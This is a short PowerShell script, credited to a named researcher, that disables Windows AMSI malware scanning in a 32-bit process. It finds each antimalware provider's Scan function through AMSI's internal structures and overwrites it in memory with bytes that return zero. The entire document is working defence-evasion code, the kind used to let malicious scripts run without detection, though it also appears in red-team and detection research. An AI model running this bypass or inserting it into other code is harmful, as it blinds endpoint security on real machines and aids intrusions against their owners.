Write-Host "AMSI providers' scan interception"
Write-Host "-- Maor Korkos (@maorkor)"
Write-Host "-- 32bit implemetation"

$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("amsi")]
  public static extern int AmsiInitialize(string appName, out IntPtr context);
}
"@
Add-Type $APIs

# Declare varaibles
$SIZE_OF_PTR = 4
$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$ctx = 0; $p = 0; $i = 0

# Calling AmsiInitialize to recieve a new AMS1 Context 
[APIs]::AmsiInitialize("MyAmsiScanner", [ref]$ctx)
Write-host "AMS1 context:" $ctx

# Find the AntiMalwareProviders list in CAmsiAntimalware
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt32($ctx+8)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36)

# Loop through all the providers
while ($AntimalwareProvider -ne 0)
{
  # Find the provider's Scan function
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProviderVtbl + 12)
  
  # Patch the Scan function
  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, $AmsiProviderScanFunc, 6)
  
  $i++
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36 + ($i*$SIZE_OF_PTR))
}
